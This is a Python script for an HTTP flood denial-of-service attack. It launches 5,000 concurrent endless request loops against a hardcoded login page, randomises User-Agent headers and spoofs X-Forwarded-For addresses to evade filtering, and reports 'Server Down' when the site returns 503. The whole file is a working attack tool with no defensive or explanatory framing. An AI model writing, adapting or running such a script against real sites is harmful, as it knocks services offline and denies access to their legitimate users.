import aiohttp
import asyncio
import os
import importlib
import getpass
import time
import string
from fake_useragent import UserAgent
import sys
import random

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


clear_screen()
# 

total_requests = 100000000000000000000000
requests_per_second = 5000  # Adjusted to a reasonable number for most systems
ua = UserAgent()

def generate_random_ip():
    return '.'.join([str(random.randint(1, 255)) for _ in range(4)])

# Function to generate random headers
def generate_headers():
    headers = {
        'User-Agent': ua.random,
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'X-Forwarded-For': generate_random_ip(),
        'From': ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + "@example.com"
    }
    return headers

async def attack(target_url):
    try:
        async with aiohttp.ClientSession() as session:
            while True:
                headers = generate_headers()
                async with session.get(target_url, headers=headers) as response:
                    if response.status == 503:
                        print("Server Down")
                    elif response.status == 200:
                        print("Website still up")
                    else:
                        print(f"Unexpected status code: {response.status}")
    except aiohttp.ClientError as e:
        print(f"Client error: {e}")
    except asyncio.TimeoutError:
        print("Request timed out")
    except Exception as e:
        print(f"Unexpected error: {e}")

async def main(target_url):
    await asyncio.gather(
        *[attack(target_url) for _ in range(requests_per_second)]
    )

if __name__ == "__main__":
    target_url = 'https://adamftd.org/login'
    asyncio.run(main(target_url))